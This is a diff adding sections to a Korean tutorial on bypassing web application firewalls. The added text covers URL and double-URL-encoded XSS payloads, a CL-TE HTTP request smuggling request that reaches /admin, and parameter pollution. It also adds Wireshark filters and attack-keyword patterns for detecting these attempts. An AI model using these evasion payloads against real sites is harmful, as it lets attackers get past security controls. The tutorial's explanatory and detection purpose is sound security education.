@@ -84,6 +84,22 @@ WAF: UNION, SELECT 등 키워드 감지 → 차단
 WAF는 원본 문자열을 차단하지만, 인코딩된 문자열은 통과할 수 있다.
 서버는 인코딩을 디코딩하여 처리하므로, 동일한 효과가 발생한다.
 
+**패킷 레벨에서의 차이**:
+```
+원본 (WAF가 차단):
+47 45 54 20 2f 73 65 61 72 63 68 3f 71 3d 3c 73 63 72 69 70 74 3e
+G  E  T     /  s  e  a  r  c  h  ?  q  =  <  s  c  r  i  p  t  >
+                                             ↑ WAF: <script> 패턴 탐지!
+
+URL 인코딩 후 (WAF 통과 가능):
+47 45 54 20 2f 73 65 61 72 63 68 3f 71 3d 25 33 43 73 63 72 69 70 74 25 33 45
+G  E  T     /  s  e  a  r  c  h  ?  q  =  %  3  C  s  c  r  i  p  t  %  3  E
+                                             ↑ WAF: %3C... 패턴 없음 → 통과
+
+→ 웹 서버가 URL 디코딩하면 다시 <script>가 됨
+→ WAF 검사 시점과 서버 처리 시점의 차이를 악용
+```
+
 ### 2.1 URL 인코딩
 
 ```
@@ -311,6 +327,41 @@ WAF가 JSON/XML 파싱을 다르게 처리하면 우회 가능
 
 프론트엔드 WAF/프록시와 백엔드 서버가 Content-Length와 Transfer-Encoding을 다르게 해석할 때 발생.
 
+HTTP/1.1에는 메시지 길이를 결정하는 방법이 두 가지 있다:
+
+```
+방법 1: Content-Length (CL)
+→ 바이트 수로 Body 끝을 결정
+→ Content-Length: 13 → Body의 처음 13 바이트가 이 요청
+
+방법 2: Transfer-Encoding: chunked (TE)
+→ 각 청크의 크기를 16진수로 명시
+→ 크기 0인 청크가 메시지 끝을 의미
+
+RFC 2616: 두 헤더가 동시에 있으면 Transfer-Encoding 우선
+하지만 일부 서버/프록시는 이를 다르게 구현한다
+```
+
+**CL-TE 공격 (가장 흔한 유형)**:
+```
+TCP 패킷 내용 (바이트 단위로 하나의 TCP 연결에 전송):
+
+POST / HTTP/1.1\r\n
+Host: target.com\r\n
+Content-Length: 30\r\n          ← 프론트엔드가 사용
+Transfer-Encoding: chunked\r\n ← 백엔드가 사용
+\r\n
+0\r\n                           ← 백엔드: 청크 종료 (여기까지가 첫 번째 요청)
+\r\n
+GET /admin HTTP/1.1\r\n         ← 프론트엔드는 CL=30에 포함된 Body로 봄
+Host: target.com\r\n                 백엔드는 이것을 "다음 요청의 시작"으로 봄
+\r\n
+
+프론트엔드 (CL 기준): 전체를 하나의 요청으로 봄 → WAF 검사 통과
+백엔드 (TE 기준): "0\r\n\r\n"에서 첫 요청 종료
+                 → "GET /admin..."을 새로운 요청으로 처리!
+```
+
 ```
 POST / HTTP/1.1
 Host: target.com
@@ -325,6 +376,11 @@ SMUGGLED_REQUEST_HERE
 - 프론트엔드: Content-Length=13 기준으로 처리
 - 백엔드: Transfer-Encoding 기준으로 처리
 - 불일치로 인해 두 번째 요청이 다음 요청에 "주입"됨
+
+**Request Smuggling이 위험한 이유**:
+- WAF를 완전히 우회한다 (프론트엔드는 하나의 요청으로 봄)
+- 다른 사용자의 요청에 공격 페이로드를 주입할 수 있다
+- 캐시를 오염시킬 수 있다 (Cache Poisoning)
 
 ### 5.3 X-Forwarded-For 조작
 
@@ -435,6 +491,101 @@ Layer 5 (모니터링): WAF 로그 분석, 이상 트래픽 탐지
 4. 주기적 페네트레이션 테스트
    → WAF가 실제로 차단하는지 검증
    → 우회 가능한 취약점 발견
+```
+
+---
+
+## 9. Wireshark로 WAF 우회 시도 분석하기
+
+### 인코딩 우회 탐지
+
+WAF를 우회하는 인코딩된 페이로드는 Wireshark에서 확인 가능하다.
+
+```
+# URL 인코딩된 공격 패턴 탐지
+http.request.uri contains "%3C"          # < 문자
+http.request.uri contains "%27"          # ' 문자 (SQL Injection)
+http.request.uri contains "%252"         # 더블 인코딩 (%25 = %)
+
+# 공격 키워드 탐지 (대소문자 무시)
+http.request.uri matches "(?i)(union|select|script|onerror)"
+```
+
+캡처 예시 (인코딩 우회 시도):
+```
+Follow TCP Stream:
+
+[요청 1 - 차단됨]
+GET /search?q=<script>alert('XSS')</script> HTTP/1.1
+→ WAF: 403 Forbidden
+
+[요청 2 - 인코딩 우회 시도]
+GET /search?q=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E HTTP/1.1
+→ WAF 검사 결과에 따라 통과 또는 차단
+
+[요청 3 - 더블 인코딩]
+GET /search?q=%253Cscript%253Ealert(%2527XSS%2527)%253C/script%253E HTTP/1.1
+→ WAF가 1차 디코딩만 하면 %3Cscript%3E → 패턴 미탐지 → 통과
+→ 서버가 2차 디코딩 → <script>alert('XSS')</script> 실행
+```
+
+### Request Smuggling 탐지
+
+```
+# Content-Length와 Transfer-Encoding이 동시에 있는 요청
+http.content_length && http.transfer_encoding
+
+# Chunked 인코딩 사용 요청
+http.transfer_encoding == "chunked"
+```
+
+Wireshark 분석 포인트:
+```
+하나의 TCP 연결에서 HTTP 메시지 경계를 확인:
+1. Analyze > Follow > TCP Stream 선택
+2. Content-Length 값과 실제 Body 크기 비교
+3. Body 끝에 추가 HTTP 요청이 보이면 → Smuggling 시도
+
+CL-TE 공격 예시:
+TCP Stream 전체 내용:
+───────────────────────────────────
+POST / HTTP/1.1
+Content-Length: 40
+Transfer-Encoding: chunked
+
+0                    ← 청크 종료
+                     ← 빈 줄
+GET /admin HTTP/1.1  ← 스머글링된 요청!
+Host: target.com
+───────────────────────────────────
+→ Content-Length=40은 전체를 하나의 요청으로 봄
+→ Transfer-Encoding=chunked는 "0\r\n\r\n"에서 끊음
+→ GET /admin이 백엔드에서 별도 요청으로 처리됨
+```
+
+### HTTP Parameter Pollution 탐지
+
+```
+# 같은 파라미터가 여러 번 나오는 요청
+# Wireshark에서 직접 필터링은 어렵지만 TCP Stream으로 확인 가능
+
+Follow TCP Stream에서 확인:
+GET /transfer?amount=100&to=admin&amount=1000000 HTTP/1.1
+                ↑ 첫 번째           ↑ 두 번째 (실제 사용되는 값)
+```
+
+### WAF 차단 응답 식별
+
+```
+# WAF가 차단한 응답 (일반적인 패턴)
+http.response.code == 403
+http.response.code == 406
+
+# WAF 제품별 응답 헤더
+http.server contains "cloudflare"
+http.server contains "ModSecurity"
+frame contains "Request Rejected"
+frame contains "Access Denied"
 ```
 
 ---
